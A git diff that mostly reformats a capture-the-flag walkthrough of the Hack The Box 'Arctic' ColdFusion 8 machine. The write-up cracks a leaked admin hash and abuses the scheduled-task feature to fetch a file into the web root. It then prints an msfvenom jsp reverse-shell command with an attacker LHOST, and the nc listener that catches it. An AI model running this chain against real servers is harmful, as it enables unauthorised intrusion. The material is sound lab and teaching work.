@@ -46,6 +46,7 @@ Nmap done: 1 IP address (1 host up) scanned in 229.52 seconds
 ```bash
 #Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 
 ```
+
 ![image](https://user-images.githubusercontent.com/96747355/163635889-e7680cdf-619b-4e4f-b79c-c116d8fe1bef.png)  
 
 - If we go on crackstation.net we can easily find the password `happyday`  
@@ -71,23 +72,22 @@ Nmap done: 1 IP address (1 host up) scanned in 229.52 seconds
 
 - Ok another try without the greek chars cause it does not seem to work as well so if I type ony `08:30` instead of `8:37 πμ` the task is scheduled.
 
-![shell2](../.res/2022-09-04-08-36-31.png)
+![shell2](../.res/2022-09-04-08-36-31.png)  
 
-- Third try
+- Third try  
 ![3rd try](../.res/2022-09-04-08-48-58.png)  
-- This is asking for a valid dir name. We can find some in server settings > Mappings (our file will be uploaded there so make sure to put it somewhere you will easily find it)
-![mappings](../.res/2022-09-04-08-51-34.png)
-- Now we can modify our task accordingly `C:\ColdFusion8\wwwroot\CFIDE\shell.exe`
-![proper path](../.res/2022-09-04-08-53-24.png)
+- This is asking for a valid dir name. We can find some in server settings > Mappings (our file will be uploaded there so make sure to put it somewhere you will easily find it)  
+![mappings](../.res/2022-09-04-08-51-34.png)  
+- Now we can modify our task accordingly `C:\ColdFusion8\wwwroot\CFIDE\shell.exe`  
+![proper path](../.res/2022-09-04-08-53-24.png)  
 - Now let's do our system probe (page 87 of the slides)
-- We click on define new probe
-![probe](../.res/2022-09-04-09-00-53.png)
-![probe2](../.res/2022-09-04-09-02-32.png)
-
+- We click on define new probe  
+![probe](../.res/2022-09-04-09-00-53.png)  
+![probe2](../.res/2022-09-04-09-02-32.png)  
 
 > I do not get a shell this way either with meterpreter or nc even though the files are being fetch from my http server.
 
-- Let's try to upload another type of payload and execute it through the directory listing misconfiguration. Let's try jsp (according to the doc "ColdFusion pages and JSP pages can interoperate in several ways" see here: https://helpx.adobe.com/coldfusion/developing-applications/using-web-elements-and-external-objects/integrating-jee-and-java-elements-in-cfml-applications/interoperating-with-jsp-pages-and-servlets.html)
+- Let's try to upload another type of payload and execute it through the directory listing misconfiguration. Let's try jsp (according to the doc "ColdFusion pages and JSP pages can interoperate in several ways" see [here](https://helpx.adobe.com/coldfusion/developing-applications/using-web-elements-and-external-objects/integrating-jee-and-java-elements-in-cfml-applications/interoperating-with-jsp-pages-and-servlets.html) )
 - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=5555 -f raw > shell.jsp` We generate our jsp shell
 - `rlwrap nc -lvp 5555` we set our listener
 - We upload it to our target with the scheduled Task
@@ -95,14 +95,14 @@ Nmap done: 1 IP address (1 host up) scanned in 229.52 seconds
 - And our output has to be saved like this: `C:\ColdFusion8\wwwroot\CFIDE\shell.jsp`
 ![jsp upload](../.res/2022-09-04-10-13-39.png)  
 - I forgot to mention it before but the time does not really matter because we can just launch a task by clicking on the green icon here in front of the task  
-![green icon](../.res/2022-09-04-10-15-38.png)
+![green icon](../.res/2022-09-04-10-15-38.png)  
 - Our shell gets fetch  
-![fetch jsp](../.res/2022-09-04-10-16-19.png)
+![fetch jsp](../.res/2022-09-04-10-16-19.png)  
 - And it is in our target  
-![jsp in target](../.res/2022-09-04-10-17-08.png)
+![jsp in target](../.res/2022-09-04-10-17-08.png)  
 - Let's click on it and pray to catch the shell this time :)
-- It finally works!!
-![shell](../.res/2022-09-04-10-19-57.png)
+- It finally works!!  
+![shell](../.res/2022-09-04-10-19-57.png)  
 - We get a shell as tolis
 
 ```dos
@@ -113,7 +113,7 @@ arctic\tolis
 - Let's get the user flag  
 ![get user](../.res/2022-09-04-10-24-10.png)
 
-> Another way (without needing the password) would also have been to use Metasploit https://www.exploit-db.com/exploits/16788 or a script like this one https://github.com/zaphoxx/zaphoxx-coldfusion/blob/main/2265.py
+> Another way (without needing the password) would also have been to use [Metasploit](https://www.exploit-db.com/exploits/16788) or a script like [this one](https://github.com/zaphoxx/zaphoxx-coldfusion/blob/main/2265.py)
 > - We would take the python script in our target, 
 > - Generate the jsp with msfvenom, 
 > - Setup our listener, 
